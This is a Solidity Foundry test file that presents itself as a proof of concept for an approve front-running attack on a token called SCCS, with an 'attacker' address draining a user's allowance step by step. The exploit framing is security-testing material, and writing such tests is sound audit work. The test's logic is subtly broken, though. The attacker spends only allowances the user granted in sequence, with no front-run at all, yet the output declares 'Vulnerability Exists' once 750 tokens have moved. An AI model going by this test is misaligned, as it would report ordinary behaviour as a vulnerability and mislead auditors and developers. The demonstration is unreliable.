// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SCCS.sol";

contract SCCSApproveTest is Test {
    SCCS public token;
    address owner;
    address user;
    address attacker;

    function setUp() public {
        owner = vm.addr(1);
        user = vm.addr(2);
        attacker = vm.addr(3);

        vm.startPrank(owner);
        token = new SCCS();
        uint256 userBalance = 1000 * 10 ** token.decimals();
        token.transfer(user, userBalance);
        vm.stopPrank();
    }

    function testApproveFrontRunning() public {
        uint256 amount = 500 * 10 ** token.decimals();
        uint256 halfAmount = amount / 2;
        uint256 initialUserBalance = token.balanceOf(user);
        uint256 initialAttackerBalance = token.balanceOf(attacker);
        uint256 initialAllowance = token.allowance(user, attacker);

        console.log("\n--- Initial State ---");
        console.log("User initial balance:     ", initialUserBalance);
        console.log("Attacker initial balance: ", initialAttackerBalance);
        console.log("Initial allowance:        ", initialAllowance);

        // Step 1: First approval
        console.log("\n--- Step 1: User approves 500 ---");
        console.log("BEFORE:");
        console.log("  User balance:     ", token.balanceOf(user));
        console.log("  Attacker balance: ", token.balanceOf(attacker));
        console.log("  Allowance:        ", token.allowance(user, attacker));

        vm.prank(user);
        token.approve(attacker, amount);

        console.log("\nAFTER:");
        console.log("  User balance:     ", token.balanceOf(user), " (no change)");
        console.log("  Attacker balance: ", token.balanceOf(attacker), " (no change)");
        console.log("  Allowance:        ", token.allowance(user, attacker), " (should be 500)");
        console.log("TRIGGER: User approves attacker for 500 tokens");

        // Advance to new block
        vm.roll(block.number + 1);
        
        // Step 2: First transfer
        console.log("\n--- Step 2: Attacker transfers 500 ---");
        console.log("BEFORE:");
        console.log("  User balance:     ", token.balanceOf(user));
        console.log("  Attacker balance: ", token.balanceOf(attacker));
        console.log("  Allowance:        ", token.allowance(user, attacker));

        vm.prank(attacker);
        token.transferFrom(user, attacker, amount);

        console.log("\nAFTER:");
        console.log("  User balance:     ", token.balanceOf(user), " (should decrease 500)");
        console.log("  Attacker balance: ", token.balanceOf(attacker), " (should increase 500)");
        console.log("  Allowance:        ", token.allowance(user, attacker), " (should be 0)");
        console.log("TRIGGER: Attacker transfers 500 from user");

        // Verify first transfer
        assertEq(token.balanceOf(attacker), amount, "First transfer failed");
        assertEq(token.allowance(user, attacker), 0, "Allowance not consumed");
        
        // Step 3: Second approval
        console.log("\n--- Step 3: User reduces approval to 250 ---");
        console.log("BEFORE:");
        console.log("  Allowance:        ", token.allowance(user, attacker));

        vm.prank(user);
        token.approve(attacker, halfAmount);

        console.log("\nAFTER:");
        console.log("  Allowance:        ", token.allowance(user, attacker), " (should be 250)");
        console.log("TRIGGER: User changes allowance from 0 to 250");

        // Step 4: Second transfer
        console.log("\n--- Step 4: Attacker transfers 250 ---");
        console.log("BEFORE:");
        console.log("  User balance:     ", token.balanceOf(user));
        console.log("  Attacker balance: ", token.balanceOf(attacker));
        console.log("  Allowance:        ", token.allowance(user, attacker));

        vm.prank(attacker);
        token.transferFrom(user, attacker, halfAmount);

        console.log("\nAFTER:");
        console.log("  User balance:     ", token.balanceOf(user), " (should decrease by 250)");
        console.log("  Attacker balance: ", token.balanceOf(attacker), " (should increase by 250)");
        console.log("  Allowance:        ", token.allowance(user, attacker), " (should be 0)");
        console.log("TRIGGER: Attacker transfers 250 from user");

        // Final verification and verdict
        uint256 finalUserBalance = token.balanceOf(user);
        uint256 finalAttackerBalance = token.balanceOf(attacker);
        uint256 totalTransferred = amount + halfAmount;
        uint256 userLoss = initialUserBalance - finalUserBalance;
        uint256 attackerGain = finalAttackerBalance - initialAttackerBalance;

        console.log("\n--- Final State ---");
        console.log("Total user tokens lost:    ", userLoss);
        console.log("Total attacker gain:       ", attackerGain);
        console.log("Expected total transfer:   ", totalTransferred);
        console.log("Vulnerability exists: Attacker able to spend 750 tokens?");

        // Vulnerability verdict
        bool vulnerabilityExists = (userLoss == totalTransferred) && 
                                  (attackerGain == totalTransferred);
        
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Attacker transferred 750 tokens despite allowance reduction");
        } else {
            console.log("Vulnerability not Exist: Transfer amounts do not show double-spend behavior");
        }
    }
}